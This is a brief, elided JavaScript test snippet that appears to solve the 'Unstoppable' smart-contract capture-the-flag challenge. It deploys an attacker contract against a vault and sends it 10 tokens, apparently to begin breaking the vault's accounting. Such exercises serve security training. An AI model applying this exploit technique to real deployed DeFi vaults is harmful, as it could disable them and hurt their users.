...
describe("[Challenge] Unstoppable", function () {
  ...
  it("Execution", async function () {
    ...
    const attackerContract = await (
      await ethers.getContractFactory("UnstoppableAttacker", player)
    ).deploy(vault.address, token.address);
    const TOKENS_TO_TRANSFER = ethers.utils.parseEther("10"); // 10 tokens

    // Connect to the token contract as the player
    const tokenAsPlayer = token.connect(player);

    // Transfer the tokens to the attacker contract
    await tokenAsPlayer.transfer(attackerContract.address, TOKENS_TO_TRANSFER);
